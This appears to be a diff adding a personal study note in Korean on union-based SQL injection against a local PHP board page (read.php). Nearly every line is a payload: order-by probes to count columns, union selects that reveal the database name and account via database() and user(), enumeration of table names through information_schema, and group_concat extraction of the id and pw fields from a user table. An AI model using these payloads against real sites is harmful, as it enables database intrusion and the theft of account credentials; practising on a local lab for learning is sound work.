@@ -1,0 +1,37 @@
+select * from board where id union select 1,2,3,4,5,6,7,8,9;
+
+
+http://localhost/read.php?id=3 order by 1#
+http://localhost/read.php?id=3 order by 2#
+http://localhost/read.php?id=3 order by 3#
+http://localhost/read.php?id=3 order by 4#
+http://localhost/read.php?id=3 order by 5#
+http://localhost/read.php?id=3 order by 6#
+http://localhost/read.php?id=3 order by 7#
+http://localhost/read.php?id=3 order by 8#
+http://localhost/read.php?id=3 order by 9#
+http://localhost/read.php?id=3 order by 10#
+// 게시글에 쓰이는 테이블 수를 알아 내기 위한 작업
+// n 부터 출력 오류가 발생하면 필드 수는 n-1 
+
+http://localhost/read.php?id=0 union select 1,2,3,4,5,6,7,8,9#
+// 각 필드 값이 게시글의 어느 부분에 표시되는지를 파악
+
+http://localhost/read.php?id=0 union select 1,database(),3,4,5,6,7,8,9#
+// 데이터베이스 이름을 알아보기 위해 2번째 필드 값을 datebase() 함수를 사용
+
+http://localhost/read.php?id=0 union select 1,database(),3,4,user(),6,7,8,9#
+// 연결된 데이터베이스 계정을 알아내기 위해 user() 함수를 사용
+
+http://localhost/read.php?id=0 union select 1,database(),3,4,user(),(select group_concat(table_name) from information_schema.tables where table_schema='member'),7,8,9#
+// 테이블 이름을 알아내기 위해 information_schema.tables 를 사용
+
+http://localhost/read.php?id=0 union select 1,database(),3,4,user(),(select group_concat(id) from test),7,8,9#
+// 테이블의 id 필드의 레코드 목록을 출력하여 각 계정 정보를 알아낼 수 있다
+
+
+http://localhost/read.php?id=0 union select 1,database(),3,4,user(),(select group_concat(pw) from test),7,8,9#
+
+// 테이블의 pw 필드의 레코드 목록을 출력하여 각 계정 정보를 알아낼 수 있다
+
+
